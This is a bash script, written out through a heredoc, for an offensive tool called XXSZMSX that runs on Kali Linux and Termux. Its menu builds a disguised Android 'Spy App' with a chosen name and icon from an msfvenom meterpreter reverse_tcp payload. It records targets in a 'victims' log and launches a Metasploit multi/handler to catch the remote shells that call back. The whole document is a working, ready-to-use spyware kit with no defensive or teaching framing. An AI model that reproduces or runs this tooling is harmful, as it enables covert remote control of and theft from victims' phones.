cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: XXSZMSX (FIXED INTERFACE)
# COMPATIBILITY: KALI LINUX & TERMUX
# =====================================================

RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
LOG_FILE=".victims_log.txt"
DB_FILE=".studio_config"

# --- [ DETECTION: KALI OR TERMUX ] ---
if [[ -d "/data/data/com.termux/files/usr/bin" ]]; then
    OS="TERMUX"
    SAVE_DIR="/sdcard"
else
    OS="KALI-LINUX"
    SAVE_DIR="$HOME/Desktop"
fi

# --- [ LOGIN INTERFACE ] ---
clear
echo -e "${RED}====================================================="
echo -e "         XXSZMSX SYSTEM - SECURE ACCESS             "
echo -e "=====================================================${NC}"
read -p "[+] Username: " username
read -s -p "[+] Password: " password
echo ""

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${RED}[!] Access Denied! Invalid Credentials.${NC}"
    exit 1
fi

while true; do
    clear
    echo -e "${RED}"
    echo "  __  __  __  __  ____  _____  __  __  ____  __  __ "
    echo "  \ \/ /  \ \/ / / ___||__  / |  \/  |/ ___| \ \/ / "
    echo "   \  /    \  /  \___ \  / /  | |\/| |\___ \  \  /  "
    echo "   /  \    /  \   ___) |/ /_  | |  | | ___) | /  \  "
    echo "  /_/\_\  /_/\_\ |____//____| |_|  |_||____/ /_/\_\ "
    echo "                                                     "
    echo "                [ X X S Z M S X ]                    "
    echo -e "${YELLOW}-------------------------------------------------------------${NC}"
    echo -e "  USER: $username          |    OS: $OS"
    echo -e "-------------------------------------------------------------"
    echo -e " 1) Build Spy App (Custom Name & Icon)"
    echo -e " 2) Victims Database (Logs)"
    echo -e " 3) Start Controller (Metasploit)"
    echo -e " 0) Exit"
    echo "-------------------------------------------------------------"
    read -p "XXSZMSX >> " choice

    case $choice in
        1) 
           read -p "[+] Enter App Name: " app_name
           read -p "[+] Enter Icon URL: " icon_url
           read -p "[+] Enter LHOST (IP): " lh
           read -p "[+] Enter LPORT (Port): " lp
           echo "$lh:$lp" > "$DB_FILE"
           echo "[$(date +%Y-%m-%d_%H:%M)] App: $app_name | IP: $lh | Port: $lp" >> "$LOG_FILE"
           echo -e "${YELLOW}[*] Downloading Icon...${NC}"
           curl -s "$icon_url" -o icon.png
           echo -e "${YELLOW}[*] Building $app_name.apk...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_DIR/$app_name.apk"
           echo -e "${GREEN}[+] Success! Saved to: $SAVE_DIR/$app_name.apk${NC}" ;;
        2)
           clear
           echo -e "${BLUE}--- [ VICTIMS LOG ] ---${NC}"
           [ -f "$LOG_FILE" ] && cat "$LOG_FILE" || echo "No logs found."
           echo "-----------------------"
           read -p "Press Enter to return..." ;;
        3) 
           if [ -f "$DB_FILE" ]; then
               IP=$(cut -d: -f1 "$DB_FILE"); PORT=$(cut -d: -f2 "$DB_FILE")
               echo -e "${GREEN}[*] Initializing Metasploit on $IP:$PORT...${NC}"
               msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j"
           else
               echo -e "${RED}[!] Error: No config found.${NC}"; sleep 2
           fi ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done
EOF
